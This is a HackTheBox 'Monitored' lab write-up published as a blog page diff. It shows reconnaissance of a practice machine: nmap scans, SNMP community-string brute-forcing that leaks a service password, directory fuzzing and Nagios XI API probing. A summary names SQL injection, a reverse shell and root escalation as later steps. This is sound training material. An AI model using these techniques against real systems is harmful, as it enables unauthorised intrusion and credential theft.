@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=f370706ab859f7c6b518d87d4c5b40d3ba635007">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox Monitored Writeup | Gabriel’s writeups</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HackTheBox Monitored Writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root." />
+<meta property="og:description" content="In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Monitored.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Monitored.html" />
+<meta property="og:site_name" content="Gabriel’s writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-11T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox Monitored Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-05-11T00:00:00+02:00","datePublished":"2024-05-11T00:00:00+02:00","description":"In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root.","headline":"HackTheBox Monitored Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Monitored.html"},"url":"http://localhost:4000/writeups/2024/HTB/Monitored.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel's writeups</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/solutions">Solutions</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+
+            <small class="m-2">2024</small>
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HackTheBox Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HackTheBox Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HackTheBox Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HackTheBox Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HackTheBox Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HackTheBox Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HackTheBox Monitored Writeup</span> <span class="points"> [40 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port Scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Let’s start with a port scanning with nmap to see which ports are opened</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -n -Pn 10.10.11.248 -oN tcpTargeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 20:35 CEST
+Nmap scan report for 10.10.11.248
+Host is up (0.22s latency).
+Not shown: 60939 closed tcp ports (reset), 4591 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
+|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
+|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
+80/tcp   open  http       Apache httpd 2.4.56
+|_http-title: Did not follow redirect to https://nagios.monitored.htb/
+|_http-server-header: Apache/2.4.56 (Debian)
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Nagios XI
+| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
+| Not valid before: 2023-11-11T21:46:55
+|_Not valid after:  2297-08-25T21:46:55
+|_http-server-header: Apache/2.4.56 (Debian)
+5667/tcp open  tcpwrapped
+Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>Also, a UDP scan (besides TCP) for this machine is useful:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --min-rate 5000 -sU --open -n -Pn 10.10.11.248 -oN udpTargeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 20:40 CEST
+Warning: 10.10.11.248 giving up on port because retransmission cap hit (10).
+Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 18.82% done; ETC: 20:42 (0:01:56 remaining)
+Nmap scan report for 10.10.11.248
+Host is up (0.29s latency).
+Not shown: 65384 open|filtered udp ports (no-response), 149 closed udp ports (port-unreach)
+PORT    STATE SERVICE
+123/udp open  ntp
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 147.19 seconds
+</code></pre>
+
+<p>Let’s enumerate the snmp service with <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">this guide</a> (remember that <a href="https://book.hacktricks.xyz">HackTricks</a> helps a lot) which seems interesting.</p>
+    
+      <h2 id="snmp-enumeration">
+        
+        
+          SNMP enumeration <a href="#snmp-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>First, we have to discover the community string (is like a password for snmp) bruteforcing with a tool called onesixtyone and a dictionary from SecLists (/opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt):</p>
+
+<pre><code class="language-bash">❯ onesixtyone -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.248
+Scanning 1 hosts, 120 communities
+10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
+</code></pre>
+
+<p>We can see that public is a valid one, now let’s enumerate the information from this service with snmpbulkwalk (snmpwalk goes very slow) and grab it to a file to easily see the info:</p>
+
+<pre><code class="language-bash">❯ snmpbulkwalk -c public -v2c 10.10.11.248 . | tee snmp_output.txt
+SNMPv2-MIB::sysDescr.0 = STRING: Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
+SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (13924496) 1 day, 14:40:44.96
+SNMPv2-MIB::sysContact.0 = STRING: Me &lt;root@monitored.htb&gt;
+SNMPv2-MIB::sysName.0 = STRING: monitored
+SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
+SNMPv2-MIB::sysServices.0 = INTEGER: 72
+SNMPv2-MIB::sysORLastChange.0 = Timeticks: (110) 0:00:01.10
+SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
+SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
+SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
+SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
+SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
+SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
+SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+SNMPv2-MIB::sysORID.11 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
+SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
+SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
+SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
+SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
+SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
+SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
+SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
+SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
+SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
+SNMPv2-MIB::sysORDescr.11 = STRING: The MIB module for logging SNMP Notifications.
+SNMPv2-MIB::sysORUpTime.1 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.2 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.3 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.4 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.5 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.6 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.7 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
+SNMPv2-MIB::sysORUpTime.11 = Timeticks: (110) 0:00:01.10
+[-- SNIP --]
+</code></pre>
+
+<p>Looking at the file we can see a sudo process that leaks a password:</p>
+
+<pre><code class="language-bash">❯ cat snmp_output.txt | grep svc
+HOST-RESOURCES-MIB::hrSWRunParameters.618 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
+HOST-RESOURCES-MIB::hrSWRunParameters.1404 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
+HOST-RESOURCES-MIB::hrSWRunParameters.1406 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
+</code></pre>
+
+<p>Now let’s see in the web for what we can use this password.</p>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>The port 80 always redirects to https://nagios.monitored.htb:</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.248
+http://10.10.11.248 [301 Moved Permanently] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.11.248], RedirectLocation[https://nagios.monitored.htb/], Title[301 Moved Permanently]
+https://nagios.monitored.htb/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.11.248], JQuery[3.6.0], Script[text/javascript], Title[Nagios XI]
+</code></pre>
+
+<p>So let’s add it to the /etc/hosts:</p>
+
+<pre><code class="language-bash">❯ echo "10.10.11.248 monitored.htb nagios.monitored.htb" | sudo tee -a /etc/hosts
+</code></pre>
+
+<p>Fuzzing for subdomains we don’t have nothing useful:</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.monitored.htb" -u https://monitored.htb --hh=3245
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://monitored.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+
+Total time: 26.99152
+Processed Requests: 4989
+Filtered Requests: 4989
+Requests/sec.: 184.8358
+</code></pre>
+
+<p>In nagios.monitored.htb, we have a Nagios XI page:</p>
+
+<p><img src="/assets/images/Monitored/main_page.png" alt="Nagios XI page" /></p>
+
+<p>And a Nagios XI login page when we click “Access Nagios XI”:</p>
+
+<p><img src="/assets/images/Monitored/nagiosxi_login.png" alt="Nagios XI login" /></p>
+
+<p>Let’s try the credentials that we grabbed before in SNMP:</p>
+
+<p><img src="/assets/images/Monitored/nagiosxi_login_svc.png" alt="Nagios XI Login svc" /></p>
+
+<p>It has a different error message than if we put another random thing, so it is likely that the account exists:</p>
+
+<p><img src="/assets/images/Monitored/different_login_error_message.png" alt="Different login error message" /></p>
+
+<p>So now we have to search another method for login in Nagios XI fuzzing (I’ll use feroxbuster for recursive searching):</p>
+
+<pre><code class="language-bash">❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/ -k
+                                                                                                                                                                                        
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/ =&gt; https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&amp;noauth=1
+301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/admin =&gt; https://nagios.monitored.htb/nagiosxi/admin/
+301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/images =&gt; https://nagios.monitored.htb/nagiosxi/images/
+301      GET        9l       28w      342c https://nagios.monitored.htb/nagiosxi/includes =&gt; https://nagios.monitored.htb/nagiosxi/includes/
+301      GET        9l       28w      338c https://nagios.monitored.htb/nagiosxi/help =&gt; https://nagios.monitored.htb/nagiosxi/help/
+301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/config =&gt; https://nagios.monitored.htb/nagiosxi/config/
+301      GET        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api =&gt; https://nagios.monitored.htb/nagiosxi/api/
+301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/tools =&gt; https://nagios.monitored.htb/nagiosxi/tools/
+301      GET        9l       28w      336c https://nagios.monitored.htb/nagiosxi/db =&gt; https://nagios.monitored.htb/nagiosxi/db/
+301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/about =&gt; https://nagios.monitored.htb/nagiosxi/about/
+301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/account =&gt; https://nagios.monitored.htb/nagiosxi/account/
+301      GET        9l       28w      345c https://nagios.monitored.htb/nagiosxi/includes/js =&gt; https://nagios.monitored.htb/nagiosxi/includes/js/
+301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/components =&gt; https://nagios.monitored.htb/nagiosxi/includes/components/
+301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/includes/css =&gt; https://nagios.monitored.htb/nagiosxi/includes/css/
+301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/mobile =&gt; https://nagios.monitored.htb/nagiosxi/mobile/
+301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes =&gt; https://nagios.monitored.htb/nagiosxi/api/includes/
+301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/reports =&gt; https://nagios.monitored.htb/nagiosxi/reports/
+301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/includes/lang =&gt; https://nagios.monitored.htb/nagiosxi/includes/lang/
+301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/themes =&gt; https://nagios.monitored.htb/nagiosxi/includes/js/themes/
+301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/css/themes =&gt; https://nagios.monitored.htb/nagiosxi/includes/css/themes/
+301      GET        9l       28w      348c https://nagios.monitored.htb/nagiosxi/includes/fonts =&gt; https://nagios.monitored.htb/nagiosxi/includes/fonts/
+301      GET        9l       28w      363c https://nagios.monitored.htb/nagiosxi/includes/components/favorites =&gt; https://nagios.monitored.htb/nagiosxi/includes/components/favorites/
+301      GET        9l       28w      361c https://nagios.monitored.htb/nagiosxi/includes/components/profile =&gt; https://nagios.monitored.htb/nagiosxi/includes/components/profile/
+301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/mobile/static =&gt; https://nagios.monitored.htb/nagiosxi/mobile/static/
+301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/backend =&gt; https://nagios.monitored.htb/nagiosxi/backend/
+301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/views =&gt; https://nagios.monitored.htb/nagiosxi/views/
+301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/jquery =&gt; https://nagios.monitored.htb/nagiosxi/includes/js/jquery/
+</code></pre>
+
+<ul>
+  <li>-k -&gt; Allow self-signed certificates</li>
+</ul>
+
+<p>In the /mobile path, we have a login interface for mobiles, but it also didn’t work login here:</p>
+
+<p><img src="/assets/images/Monitored/nagiosxi_mobile.png" alt="Nagios XI mobile" /></p>
+
+<p>The only other interesting path to login is the api. Looking in the <a href="https://assets.nagios.com/downloads/nagiosxi/docs/Accessing_The_XI_Backend_API.pdf">documentation</a> doesn’t help so we have to fuzz manually the api (with GET and POST methods):</p>
+
+<pre><code class="language-bash">❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/api/ -m GET,POST -k -t 20
+                                                                                                                                                                                        
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api/
+ 🚀  Threads               │ 20
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET, POST]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403     POST        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404     POST        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes =&gt; https://nagios.monitored.htb/nagiosxi/api/includes/
+301     POST        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes =&gt; https://nagios.monitored.htb/nagiosxi/api/includes/
+301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/api/v1 =
+&gt; https://nagios.monitored.htb/nagiosxi/api/v1/
+200      GET        1l        7w       53c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
+200     POST        1l        6w       49c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
+</code></pre>
+
+<p>We have the /v1 endpoint with authenticate and includes endpoint.</p>
+
+<p>The includes endpoint doesn’t have nothing interesting:</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET https://nagios.monitored.htb/nagiosxi/api/v1/includes -k
+{"error":"No API Key provided"}
+❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/includes -k
+{"error":"No API Key provided"}
